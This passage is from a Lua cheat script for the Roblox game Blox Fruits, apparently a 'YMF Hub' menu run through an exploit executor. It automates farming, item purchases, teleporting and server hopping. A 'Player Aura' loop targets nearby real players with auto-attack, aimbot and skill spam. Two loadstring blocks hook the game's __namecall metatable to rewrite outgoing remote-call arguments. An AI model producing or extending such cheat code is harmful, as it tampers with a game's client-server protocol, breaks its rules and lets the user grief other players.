                            if LocalPlayerFragmentValue < 5000 then 
                                AutoRaid_Toggle:Set(true)
                            elseif LocalPlayerBeliValue < 2500000 then 
                                Farm_Toggle:Set(true)
                                MethodFarm_Dropdown:Set("Level")
                            else 
                                CheckPriceAndBuyMelee("Death Step")
                            end
                        end
                    end 
                elseif Settings["Melee Choosen"]["Sharkman Karate"] and willspark["Sharkman Karate"] == 0 then
                    TeleportSea(2)
                    if willspark["Fishman Karate"] == 0 or willspark["Fishman Karate"] < 400 then
                        CheckPriceAndBuyMelee("Fishman Karate")
                        if not CheckWaterKey() then 
                            if ReturnBosses("Tide Keeper [Lv. 1475] [Boss]") then 
                                FarmBoss_Toggle:Set(true)
                                SelectBoss_Dropdown:Refresh(GetBossTable())
                                SelectBoss_Dropdown:Set("Tide Keeper [Lv. 1475] [Boss]")
                            else
                                FarmBoss_Toggle:Set(false)
                            end
                        end
                    else
                        if not CheckWaterKey() then 
                            if ReturnBosses("Tide Keeper [Lv. 1475] [Boss]") then 
                                FarmBoss_Toggle:Set(true)
                                SelectBoss_Dropdown:Refresh(GetBossTable())
                                SelectBoss_Dropdown:Set("Tide Keeper [Lv. 1475] [Boss]")
                            else
                                FarmBoss_Toggle:Set(false)
                                if Settings["HopOption"] then 
                                    HopServer()
                                end
                            end
                        else
                            if LocalPlayerFragmentValue < 5000 then 
                                AutoRaid_Toggle:Set(true)
                            elseif LocalPlayerBeliValue < 2500000 then 
                                Farm_Toggle:Set(true)
                                MethodFarm_Dropdown:Set("Level")
                            else 
                                CheckPriceAndBuyMelee("Sharkman Karate")
                            end
                        end
                    end
                elseif Settings["Melee Choosen"]["Electric Claw"] and willspark["Electric Claw"] == 0 then
                    if willspark["Electro"] == 0 or willspark["Electro"] < 400 then
                        CheckPriceAndBuyMelee("Dragon Claw")
                    elseif willspark["Electro"] >= 400 then 
                        TeleportSea(3)
                        v186 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyElectricClaw", true)
                        if v186 == 4 then 
                            game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyElectricClaw", "Start")
                            spawn(function()
                                pcall(function()
                                    tween:Cancel()
                                end)
                            end)
                            task.wait(1)
                            requestEntrance(Vector3.new(-12463.8740234375, 374.9144592285156, -7523.77392578125))
                        elseif v186 == 3 then 
                            if LocalPlayerFragmentValue < 5000 then 
                                AutoRaid_Toggle:Set(true)
                            elseif LocalPlayerBeliValue < 3000000 then 
                                Farm_Toggle:Set(true)
                                MethodFarm_Dropdown:Set("Level")
                            else 
                                CheckPriceAndBuyMelee("Electric Claw")
                            end
                        elseif v186 ~= 1 then 
                            CheckPriceAndBuyMelee("Electric Claw")
                        end
                    end
                elseif Settings["Melee Choosen"]["Dragon Talon"] and willspark["Dragon Talon"] == 0 then
                    if willspark["Dragon Claw"] == 0 or willspark["Dragon Claw"] < 400 then 
                        CheckPriceAndBuyMelee("Dragon Claw")
                    elseif willspark["Dragon Claw"] >= 400 then 
                        local v182 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyDragonTalon")
                        if v182 == 1 then 
                            wait()
                        elseif v182 == 2 then 
                            wait()
                        elseif v182 == 0  then 
                            if LocalPlayerFragmentValue < 5000 then 
                                AutoRaid_Toggle:Set(true)
                            elseif LocalPlayerBeliValue < 3000000 then 
                                Farm_Toggle:Set(true)
                                MethodFarm_Dropdown:Set("Level")
                            else 
                                CheckPriceAndBuyMelee("Dragon Talon")
                            end
                        elseif v182 == 3 then 
                            if CheckBackPack("Fire Essence") then 
                                repeat wait()
                                    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("BuyDragonTalon")
                                    task.wait(1)
                                until not Settings["Melee Choosen"]["Dragon Talon"] or not CheckBackPack("Fire Essence")
                            end
                        end
                    end
                elseif Settings["Melee Choosen"]["Godhuman"] and willspark["Godhuman"] == 0 then 
                    local zzzzzzz 
                    for i,v in pairs(willspark) do 
                        if v < 400 then 
                            zzzzzzz = true 
                        end
                    end 
                    zzzzzzz2 = {
                        ["Fish Tail"] = 20,
                        ["Magma Ore"] = 20,
                        ["Dragon Scale"] = 10,
                        ["Mystic Droplet"] = 10,
                    }
                    if not zzzzzzz then 
                        for i,v in pairs(zzzzzzz2) do 
                            if CheckMaterialCount(i) < v then 
                                Settings["Auto Farm Mob Select"] = true 
                                if i == "Fish Tail" then 
                                    repeat 
                                        TeleportSea(1)
                                        Settings["Selected Mobs"] = {
                                            "Fishman Warrior [Lv. 375]",
                                            "Fishman Commando [Lv. 400]",
                                        }
                                        task.wait(15)
                                    until not Settings["Melee Choosen"]["Godhuman"] or not Settings["Auto Melee"] or CheckMaterialCount(i) >= v 
                                elseif i == "Magma Ore" then 
                                    repeat 
                                        TeleportSea(1)
                                        Settings["Selected Mobs"] = {
                                            "Military Soldier [Lv. 300]",
                                            "Military Spy [Lv. 325]",
                                        }
                                        task.wait(15)
                                    until not Settings["Melee Choosen"]["Godhuman"] or not Settings["Auto Melee"] or CheckMaterialCount(i) >= v 
                                elseif i == "Mystic Droplet" then 
                                    repeat 
                                        TeleportSea(2)
                                        Settings["Selected Mobs"] = {
                                            "Sea Soldier [Lv. 1425]",
                                            "Water Fighter [Lv. 1450]",
                                        }
                                        task.wait(15)
                                    until not Settings["Melee Choosen"]["Godhuman"] or not Settings["Auto Melee"] or CheckMaterialCount(i) >= v 
                                elseif i == "Dragon Scale" then 
                                    repeat 
                                        TeleportSea(3)
                                        Settings["Selected Mobs"] = {
                                            "Dragon Crew Warrior [Lv. 1575]",
                                            "Dragon Crew Archer [Lv. 1600]",
                                        }
                                        task.wait(15)
                                    until not Settings["Melee Choosen"]["Godhuman"] or not Settings["Auto Melee"] or CheckMaterialCount(i) >= v 
                                end
                            end
                        end
                    else
                        Settings["Auto Farm Mob Select"] = false
                    end
                end
            end
        end
    end
end)
spawn(function()
    if Settings["Auto Melee"] then 
        if Settings["Melee Choosen"]["Dragon Talon"] and willspark and willspark["Dragon Talon"] == 0 then 
            local v251, v252, v253, v254 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("Bones", "Check");
            if v251 >= 50 then
                game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("Bones","Buy",1,1)
            end
            task.wait(5)
        end
    end
end)
local AutoStats_Toggle = MainTab:AddToggle(
    {
        Name = "Auto Stats",
        Default = Settings["Auto Stats"],
        Save = false,
        Callback = function(Value)
            SaveSettings("Auto Stats", Value)
        end
    }
)
spawn(
    function()
        while task.wait() do
            if Settings["Auto Stats"] then
                for i, v in pairs(tablestatssave) do
                    if v then
                        local args = {
                            [1] = "AddPoint",
                            [2] = i,
                            [3] = 9999
                        }
                        game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                    end
                end
            end
        end
    end
)
MainTab:AddButton(
    {
        Name = "Cancel Tween",
        Callback = function()
            CancelTween()
        end
    }
)
local AttackNoCDAuraToggle =
    MainTab:AddToggle(
    {
        Name = "Attack No CD Aura",
        Default = Settings["Attack No CD Aura"],
        Save = false,
        Flag = "Aura",
        Callback = function(Value)
            SaveSettings("Attack No CD Aura", Value)
        end
    }
)
MainTab:AddBind(
    {
        Name = "Attack No CD Aura Bind",
        Default = Enum.KeyCode.L,
        Hold = false,
        Callback = function()
            AttackNoCDAuraToggle:Set(not Settings["Attack No CD Aura"])
        end
    }
)
MainTab:AddToggle(
    {
        Name = "Same Y Tween",
        Default = Settings["Ignore Y"],
        Save = false,
        Flag = "IngoreY",
        Callback = function(Value)
            IngoreY = Value
            SaveSettings("Ignore Y", Value)
        end
    }
)

ALLNPCOOO = {}
for i, v in pairs(getnilinstances()) do
    if
        v:IsA("Model") and v:FindFirstChild("Head") and v.Head:FindFirstChild("QuestBBG") and
            v.Head.QuestBBG.Title.Text == "MISC."
     then
        ALLNPCOOO[v.Name] = v.Head.CFrame * CFrame.new(0, -2, 2)
    end
end
for i, v in pairs(game.Workspace.NPCs:GetDescendants()) do
    if v.Name == "QuestBBG" and v.Title.Text == "MISC." then
        ALLNPCOOO[v.Parent.Parent.Name] = v.Parent.Parent.Head.CFrame * CFrame.new(0, -2, 2)
    end
end
ALLNPCOOO2 = {}
for i, v in pairs(ALLNPCOOO) do
    table.insert(ALLNPCOOO2, i)
end
MainTab:AddDropdown(
    {
        Name = "Tween To NPC",
        Default = "",
        Options = ALLNPCOOO2,
        Callback = function(Value)
            if Value == "Ancient One" then
                if
                    (TempleOfTimeCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >
                        2000
                 then
                    TweenTemple()
                    local args = {
                        [1] = "RaceV4Progress",
                        [2] = "Check"
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                    local args = {
                        [1] = "RaceV4Progress",
                        [2] = "Teleport"
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                    Tweento(ALLNPCOOO[Value])
                else
                    Tweento(ALLNPCOOO[Value])
                end
            else
                Tweento(ALLNPCOOO[Value])
            end
        end
    }
)
ClickedSea = {
    ["Sea 1"] = 0,
    ["Sea 2"] = 0,
    ["Sea 3"] = 0
}
Seas = {
    "Sea 1",
    "Sea 2",
    "Sea 3"
}

function TeleportSea(Sea)
    ----print("Teleporting Sea: " .. Sea)
    if Sea == 1 then
        if not CheckSea(Sea) then
            local args = {
                [1] = "TravelMain"
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
            wait()
        end
    elseif Sea == 2 then
        if not CheckSea(Sea) then
            local args = {
                [1] = "TravelDressrosa"
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end
    elseif Sea == 3 then
        if not CheckSea(Sea) then
            local args = {
                [1] = "TravelZou"
            }
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
        end
    end
end
function AutoNewWorld()
    if game.PlaceId == 2753915549 then
        if
            LocalPlayerLevelValue >= 700 and
                game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") ~= 0
         then
            
            if LocalPlayerLevelValue >= 700 and game.Workspace.Map.Ice.Door.CanCollide then
                if
                    not game:GetService("Players").LocalPlayer.Character:FindFirstChild("Key") and
                        not game:GetService("Players").LocalPlayer.Backpack:FindFirstChild("Key")
                 then
                    if
                        (CFrame.new(4852.2895507813, 5.651451587677, 718.53070068359).Position -
                            game:GetService("Players").LocalPlayer.Character.HumanoidRootPart.Position).magnitude < 5
                     then
                        game.ReplicatedStorage.Remotes["CommF_"]:InvokeServer("DressrosaQuestProgress", "Detective")
                        EquipWeaponName("Key")
                    else
                        Tweento(CFrame.new(4852.2895507813, 5.651451587677, 718.53070068359))
                    end
                else
                    EquipWeaponName("Key")
                    if game:GetService("Players").LocalPlayer.Character:FindFirstChild("Key") then
                        Tweento(game.Workspace.Map.Ice.Door.CFrame)
                    end
                end
            elseif not game.Workspace.Map.Ice.Door.CanCollide then
                Target = ReturnBosses("Ice Admiral [Lv. 700] [Boss]")
                repeat
                    pcall(
                        function()
                            if game.Workspace.Enemies:FindFirstChild(Target.Name) then
                                EnableBuso()
                                EquipWeapon()
                                spawn(Tweento(Target.HumanoidRootPart.CFrame * CFrame.new(0, 40, 0)), 1)
                                UseFastAttack = true
                            else
                                Tweento(Target.HumanoidRootPart.CFrame * CFrame.new(0, 40, 0))
                                NoClip = true
                            end
                            task.wait()
                        end
                    )
                until not Target
            end
        elseif game.ReplicatedStorage.Remotes.CommF_:InvokeServer("DressrosaQuestProgress", "Dressrosa") == 0 then
            game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer("TravelDressrosa")
            AutoSea2_Toggle:Set(false)
        end
    end
end
MainTab:AddDropdown(
    {
        Name = "Teleport World",
        Default = "",
        Options = Seas,
        Callback = function(Value)
            ClickedSea[Value] = ClickedSea[Value] + 1
            if ClickedSea[Value] >= 2 then
                dkkd = tostring(Value):gsub("Sea ", "")
                dkkd2 = tonumber(dkkd)
                TeleportSea(dkkd2)
                Notify("Script Status", "Teleporting to " .. Value .. " !", 10)
            else
                Notify("Script Status", "Are You Sure Teleport To " .. Value .. " ?\nClick Again To Confirm!", 10)
                spawn(
                    function()
                        wait(10)
                        ClickedSea[Value] = ClickedSea[Value] - 1
                    end
                )
            end
        end
    }
)
if Sea3 then
    TrialTab:AddSection({Name = "Temple of Time"})
    TrialTab:AddButton(
        {
            Name = "Reset Character",
            Callback = function()
                game.Players.LocalPlayer.Character.Humanoid.Health = 0
            end
        }
    )
    TrialTab:AddButton(
        {
            Name = "Tween To Acient Clock",
            Callback = function()
                if
                    (TempleOfTimeCFrame.Position - game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >
                        2000
                 then
                    TweenTemple()
                    local args = {
                        [1] = "RaceV4Progress",
                        [2] = "Check"
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                    local args = {
                        [1] = "RaceV4Progress",
                        [2] = "Teleport"
                    }
                    game:GetService("ReplicatedStorage").Remotes.CommF_:InvokeServer(unpack(args))
                    Tweento(CFrameDiemSang1)
                    wait(.5)
                    Tweento(CFrameDiemSang2)
                    wait(.5)
                    Tweento(CFrameDiemSang3)
                    wait(.5)
                    Tweento(CFrameDiemSang4)
                    wait(.5)
                    Tweento(CFrame.new(29523.4844, 15068.6836, -87.5899963, 1, 0, 0, 0, 1, 0, 0, 0, 1))
                    wait(.5)
                    Tweento(CFrame.new(29550.5312, 15068.6592, -87.1584549, 1, 0, 0, 0, 1, 0, 0, 0, 1))
                else
                    Tweento(CFrameDiemSang1)
                    wait(.5)
                    Tweento(CFrameDiemSang2)
                    wait(.5)
                    Tweento(CFrameDiemSang3)
                    wait(.5)
                    Tweento(CFrameDiemSang4)
                    wait(.5)
                    Tweento(CFrame.new(29550.5312, 15068.6592, -87.1584549, 1, 0, 0, 0, 1, 0, 0, 0, 1))
                end
            end
        }
    )
    TrialTab:AddButton(
        {
            Name = "Tween to Current Race Door",
            Callback = function()
                TweentoCurrentRaceDoor()
            end
        }
    )
    function fireremotechoosegear(gearname)
        v = gearname 
        if v == "Gear1" then 
            print("Gear3")
            local args = {
                [1] = "TempleClock",
                [2] = "SpendPoint"
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
        elseif v == "Gear2" then 
            print("Gear2")
            local args = {
                [1] = "TempleClock",
                [2] = "SpendPoint",
                [3] = "Gear2",
                [4] = "Omega"
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
        elseif v == "Gear4" then 
            print("Gear4")
            if condimemeaymeci.B == 2 then 
                print("Gear 4 Omega")
                local args = {
                    [1] = "TempleClock",
                    [2] = "SpendPoint",
                    [3] = "Gear4",
                    [4] = "Omega"
                }
                
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
            elseif condimemeaymeci.A == 2 then 
                print("Gear 4 Alpha")
                local args = {
                    [1] = "TempleClock",
                    [2] = "SpendPoint",
                    [3] = "Gear4",
                    [4] = "Alpha"
                }
                
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
            elseif condimemeaymeci.A < 2 then 
                v14 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TempleClock", "Check")
                condimemeaymeci = v14.RaceDetails  
                print("Gear 4 Alpha")
                local args = {
                    [1] = "TempleClock",
                    [2] = "SpendPoint",
                    [3] = "Gear4",
                    [4] = "Alpha"
                }
                
                game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
            end
        elseif v == "Gear3" then 
            print("Gear3")
            local args = {
                [1] = "TempleClock",
                [2] = "SpendPoint",
                [3] = "Gear3",
                [4] = "Alpha"
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
        elseif v == "Gear5" then 
            print("Gear5")
            local args = {
                [1] = "TempleClock",
                [2] = "SpendPoint",
                [3] = "Gear5",
                [4] = "Default"
            }
            
            game:GetService("ReplicatedStorage"):WaitForChild("Remotes"):WaitForChild("CommF_"):InvokeServer(unpack(args))
        end
        game:GetService("StarterGui"):SetCore("SendNotification",{
            Title = "Select Gear", -- Required
            Text = v, -- Required
            Duration = 30,
        })
    end
    function InstantChooseGear()
        v14 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("TempleClock", "Check")
        if v14 and v14.HadPoint then   
            condimemeaymeci = v14.RaceDetails          
            CheckAndTweenTemple()
            Tweento(workspace.Map["Temple of Time"].Prompt.CFrame)
            if (workspace.Map["Temple of Time"].Prompt.Position-game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude < 3 then 
                wait(1)
                fireproximityprompt(workspace.Map["Temple of Time"].Prompt.ProximityPrompt)
                wait(5)
                for i,v in pairs(workspace.Map["Temple of Time"].InnerClock:GetChildren()) do
                    if v:FindFirstChild("Highlight") and v.Highlight.Enabled then 
                        print(v.Name)
                        spawn(function()
                            fireremotechoosegear(v.Name)
                        end)
                    end
                end
            end
            task.wait(300)
        else
            game:GetService("StarterGui"):SetCore("SendNotification",{
                Title = "You hadnt point", -- Required
                Text = "You hadnt point to choose", -- Required
                Duration = 30,
            })
            task.wait(30)
        end
    end
    spawn(function()
        while task.wait() do 
            if Settings["Auto Choose Gear"] then 
                if CheckSea(3) then 
                    InstantChooseGear()
                end
            end
        end
    end)
else
    TrialTab:AddToggle({
        Name = "Auto Beta",
        Default = Settings["CuttayV4"],
        Callback = function(v)
            SaveSettings("CuttayV4",v)
        end
    })
end
MainTab:AddButton(
    {
        Name = "Coppy Server Job Id",
        Callback = function()
            setclipboard(game.JobId)
            Notify("Script Status", "Copied Job Id!", 10)
        end
    }
)
MainTab:AddTextbox(
    {
        Name = "Put A Server Job Id Here",
        Default = "",
        TextDisappear = true,
        Callback = function(Value)
            if Value == "game.JobId" then
                InputJobId = game.JobId
            else
                InputJobId = Value
            end
            Notify("Script Status", "Inputed JobID: " .. InputJobId)
        end
    }
)
MainTab:AddButton(
    {
        Name = "Join Job Id Server",
        Callback = function()
            Notify("Notify", "Joining Server Job Id: " .. tostring(InputJobId), 10)
            w(.5)
            game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", tostring(InputJobId))
        end
    }
)
function function6()
    return math.floor(game.Lighting.ClockTime)
end
PlayerAura_Status = "None"
function CheckAcientOneStatus()
    if not game.Players.LocalPlayer.Character:FindFirstChild("RaceTransformed") then
        return "You have yet to achieve greatness"
    end
    local v227 = nil
    local v228 = nil
    local v229 = nil
    v229, v228, v227 = game.ReplicatedStorage.Remotes.CommF_:InvokeServer("UpgradeRace", "Check")
    if v229 == 1 then
        return "Required Train More"
    elseif v229 == 2 or v229 == 4 or v229 == 7 then
        return "Can Buy Gear With " .. v227 .. " Fragments"
    elseif v229 == 3 then
        return "Required Train More"
    elseif v229 == 5 then
        return "You Are Done Your Race."
    elseif v229 == 6 then
        return "Upgrades completed: " .. v228 - 2 .. "/3, Need Trains More"
    end
    if v229 ~= 8 then
        if v229 == 0 then
            return "Ready For Trial"
        else
            return "You have yet to achieve greatness"
        end
    end
    return "Remaining " .. 10 - v228 .. " training sessions."
end
function BuyGear()
    game.ReplicatedStorage.Remotes.CommF_:InvokeServer("UpgradeRace", "Buy")
    Notify("Script Tips", "You Should Reset Character To Countine", 15)
end
function PlayersCount()
    return #game.Players:GetChildren()
end
ServerTab:AddSection({Name = "Server Info"})
local function888888 = ServerTab:AddLabel("Player Count: " .. PlayersCount() .. "/" .. game.Players.MaxPlayers)
local function9 = ServerTab:AddLabel("Server Time: " .. function6() .. " | " .. function7())
local function10 = ServerTab:AddLabel("Server Chest: " .. tostring(#ChestTable))
local function11 = ServerTab:AddLabel("Acient One Status: " .. tostring(CheckAcientOneStatus()))
task.spawn(
    function()
        while task.wait() do
            pcall(
                function()
                    function888888:Set("Player Count: " .. PlayersCount() .. "/" .. game.Players.MaxPlayers)
                end
            )
            pcall(
                function()
                    function9:Set("Server Time: " .. function6() .. " | " .. function7())
                end
            )
            pcall(
                function()
                    function10:Set("Server Chest: " .. tostring(#ChestTable))
                end
            )
            pcall(
                function()
                    function11:Set("Acient One Status: " .. tostring(CheckAcientOneStatus()))
                end
            )
            task.wait(2)
        end
    end
)
ServerTab:AddSection({Name = "Hop Functions"})
ServerTab:AddButton(
    {
        Name = "Server Hop",
        Callback = function()
            HopServer()
            task.wait(5)
        end
    }
)
if Sea3 then
    ServerTab:AddToggle(
        {
            Name = "Hop Until Mirage Island",
            Default = Settings["Hop Until Mirage Island"],
            Save = false,
            Flag = "HopMirage",
            Callback = function(Value)
                HopMirage = Value
                if Value == false then
                    CancelTween()
                end
                SaveSettings("Hop Until Mirage Island", Value)
            end
        }
    )
    ServerTab:AddToggle(
        {
            Name = "Hop Until Moon is 3/4 or 4/4",
            Default = Settings["HopUntilMoon"],
            Save = false,
            Callback = function(Value)
                if Value == false then
                    CancelTween()
                end
                SaveSettings("HopUntilMoon", Value)
            end
        }
    )
end
function IsMirageIsland2()
    if game:GetService("Workspace").Map:FindFirstChild("MysticIsland") then
        return true
    else
        return false
    end
end
local Settings2 = {}
local HttpService = game:GetService("HttpService")

local SaveFileName2 = "!Blacklist_Servers.json"

function SaveSettings2()
    local HttpService = game:GetService("HttpService")
    if not isfolder("YMF Hub") then
        makefolder("YMF Hub")
    end
    writefile("YMF Hub/" .. SaveFileName2, HttpService:JSONEncode(Settings2))
end

function ReadSetting2()
    local s, e =
        pcall(
        function()
            local HttpService =game:GetService("HttpService")
            Hub = game:GetService("HttpService")
            if not isfolder("YMF Hub") then
                makefolder("YMF Hub")
            end
            return HttpService:JSONDecode(readfile("YMF Hub/" .. SaveFileName2))
        end
    )
    if s then
        return e
    else
        SaveSettings2()
        return ReadSetting2()
    end
end
Settings2 = ReadSetting2()
function HopServer(CountTarget)
    if not CountTarget then
        CountTarget = 10
    end
    ticklon = tick()
    repeat
        task.wait()
    until tick() - ticklon >= Settings["Hop Delay"]
    local function Hop()
        Notify("Script Status", "Finding Server...\nTarget Count: " .. CountTarget, 5)
        for i = 1, 100 do
            if ChooseRegion == nil or ChooseRegion == "" then
                ChooseRegion = "Singapore"
            else
                game:GetService("Players").LocalPlayer.PlayerGui.ServerBrowser.Frame.Filters.SearchRegion.TextBox.Text =
                    ChooseRegion
            end
            local huhu = game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer(i)
            for k, v in pairs(huhu) do
                if k ~= game.JobId and v["Count"] < CountTarget then
                    if not Settings2[k] or tick() - Settings2[k].Time > 60 * 10 then
                        Settings2[k] = {
                            Time = tick()
                        }
                        SaveSettings2()
                        if game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Visible then
                            Notify("Script Status", "Founded Server But InCombat", 15)
                            repeat
                                wait()
                                
                                AntiLowHealth(math.random(8500, 10000))
                            until not game:GetService("Players").LocalPlayer or
                                not game:GetService("Players").LocalPlayer.PlayerGui.Main.InCombat.Visible
                            Notify("Script Status", "Joining Server ID: " .. k .. "\nRegion: " .. v["Region"], 15)
                        else
                            Notify("Script Status", "Joining Server ID: " .. k .. "\nRegion: " .. v["Region"], 15)
                        end
                        game:GetService("ReplicatedStorage").__ServerBrowser:InvokeServer("teleport", k)
                        return true
                    elseif tick() - Settings2[k].Time > 60 * 60 then
                        Settings2[k] = nil
                    end
                end
            end
        end
        return false
    end
    if not getgenv().Loaded then
        local function child(v)
            if v.Name == "ErrorPrompt" then
                if v.Visible then
                    if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                        HopServer()
                        v.Visible = false
                    end
                end
                v:GetPropertyChangedSignal("Visible"):Connect(
                    function()
                        if v.Visible then
                            if v.TitleFrame.ErrorTitle.Text == "Teleport Failed" then
                                HopServer()
                                v.Visible = false
                            end
                        end
                    end
                )
            end
        end
        for k, v in pairs(game.CoreGui.RobloxPromptGui.promptOverlay:GetChildren()) do
            child(v)
        end
        game.CoreGui.RobloxPromptGui.promptOverlay.ChildAdded:Connect(child)
        getgenv().Loaded = true
    end
    while not Hop() do
        wait()
    end
    SaveSettings2()
end
task.spawn(
    function()
        while task.wait() do
            task.wait()
            if Sea3 and OrionLib.Flags["HopMirage"].Value then
                if IsMirageIsland2() then
                    Notify("Script Status", "Mirage Found On This Server.", 30)
                    task.wait(30)
                else
                    Notify("Script Status", "Start Hopping to find Mirage.", 30)
                    repeat 
                        HopServer()
                        task.wait(5)
                    until not OrionLib.Flags["HopMirage"].Value
                end
            end
        end
    end
)
task.spawn(
    function()
        while task.wait() do
            task.wait()
            if Settings["HopUntilMoon"] then
                k5 = CheckMoon()
                Notify(nil, k5)
                if
                    (k5 == "Full Moon" and (game.Lighting.ClockTime < 5 or game.Lighting.ClockTime > 12)) or
                        k5 == "Next Night"
                 then
                    Notify("Script Status", "Found A Moon.", 30)
                    task.wait(30)
                else
                    Notify(
                        "Script Status",
                        "Start Hopping to find Full Moon.\nHopDelay: " .. tostring(Settings["Hop Delay"]),
                        30
                    )
                    HopServer()
                    task.wait(5)
                end
            end
        end
    end
)
BlackList = {}
task.spawn(
    function()
        while task.wait() do
            if PlayerAura then
                SpamSkills = false
                AimbotDiThangNgu = false
                for i, v in pairs(game.Players:GetChildren()) do
                    if
                        v.Name ~= game.Players.LocalPlayer.Name and not BlackList[v.Name] and
                            game.Workspace.Characters:FindFirstChild(v.Name) and
                            v.Character:FindFirstChild("Humanoid") and
                            v.Character:FindFirstChild("HumanoidRootPart") and
                            (v.Character.HumanoidRootPart.Position -
                                game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <= 500 and
                            v.Character.Humanoid.Health > 0
                     then
                        pcall(
                            function()
                                PlayerAura_Status = v.Name .. " Is Team" .. tostring(v.Team)
                                SelectedPlayer = v.Name
                                repeat
                                    wait()
                                    if
                                        PlayerAura and game.Workspace.Characters:FindFirstChild(v.Name) and
                                            v.Character:FindFirstChild("Humanoid") and
                                            v.Character:FindFirstChild("HumanoidRootPart") and
                                            (v.Character.HumanoidRootPart.Position -
                                                game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
                                                500 and
                                            v.Character.Humanoid.Health > 0
                                     then
                                        --ReachDiThangNgu
                                        SelectedPlayer = v.Name
                                        AimBotSkillPosition = v.Character.HumanoidRootPart.Position
                                        PlayerTargetedCFrame_1 =
                                            v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0)
                                        if
                                            (PlayerTargetedCFrame_1.Position -
                                                game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude >
                                                750
                                         then
                                            PlayerTargetedCFrame =
                                                v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, 0)
                                        elseif ReachDiThangNgu then
                                            PlayerTargetedCFrame =
                                                v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 3, 0)
                                        elseif not ReachDiThangNgu then
                                            PlayerTargetedCFrame =
                                                v.Character.HumanoidRootPart.CFrame * CFrame.new(0, 300, 0)
                                        end
                                        Tweento(PlayerTargetedCFrame)
                                        EnableBuso()
                                        if
                                            (v.Character.HumanoidRootPart.Position -
                                                game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude <=
                                                100
                                         then
                                            UseFastAttack = true
                                            if Settings["PlayerAuraAimbot"] then
                                                AimbotDiThangNgu = true
                                            else
                                                AimbotDiThangNgu = false
                                            end
                                            if Settings["PlayerAuraSpamSkill"] then
                                                autospamskill = true
                                            else
                                                autospamskill = false
                                            end
                                        else
                                            UseFastAttack = false
                                            ----print("Turn Off Fast Attack3")
                                            autospamskill = false
                                            AimbotDiThangNgu = false
                                        end
                                    end
                                until not PlayerAura or not v or not v.Character:FindFirstChild("Humanoid") or
                                    not v.Character:FindFirstChild("HumanoidRootPart") or
                                    v.Character.Humanoid.Health <= 0 or
                                    BlackList[v.Name] or
                                    (v.Character.HumanoidRootPart.Position -
                                        game.Players.LocalPlayer.Character.HumanoidRootPart.Position).Magnitude > 500
                                PlayerAura_Status = "None"
                                UseFastAttack = false
                                ----print("Turn Off Fast Attack4")
                                autospamskill = false
                                AimbotDiThangNgu = false
                            end
                        )
                    end
                end
            end
        end
    end
)
loadstring([[
    local gg = getrawmetatable(game)
    local old = gg.__namecall
    setreadonly(gg, false)
    gg.__namecall =
        newcclosure(
        function(...)
            local method = getnamecallmethod()
            local args = {...}
            if tostring(method) == "FireServer" then
                if tostring(args[1]) == "RemoteEvent" then
                    if tostring(args[2]) ~= "true" and tostring(args[2]) ~= "false" then
                        if (AutoSeaBeast or SeaBeastTrial) and getgenv().psskill then
                            args[2] = getgenv().psskill.Position
                        end
                        if AimbotDiThangNgu and AimBotSkillPosition then
                            args[2] = AimBotSkillPosition
                        end
                        return old(unpack(args))
                    end
                end
            end
            return old(...)
        end
    )
]])()
loadstring([[
    local gt = getrawmetatable(game)
	local old = gt.__namecall
	setreadonly(gt,false)
	gt.__namecall = newcclosure(function(...)
		local args = {...}
		if getnamecallmethod() == "InvokeServer" then 
            if tostring(args[2]) == "TAP" then
                if AimbotDiThangNgu and AimBotSkillPosition then
                    args[3] = AimBotSkillPosition
                end
            end
		end
		return old(unpack(args))
	end)
]])()
FarmTab:AddSection({Name = "Farm"})
AutoActiveRace_Toggle = FarmTab:AddToggle(
    {
        Name = "Auto Active Race",
        Default = Settings["AutoActiveRace"],
        Save = false,
        Flag = "AutoActiveRace",
        Callback = function(Value)
            AutoActiveRace = Value
            if Value == false then
                CancelTween()
            end
            SaveSettings("AutoActiveRace", Value)
        end
    }
)
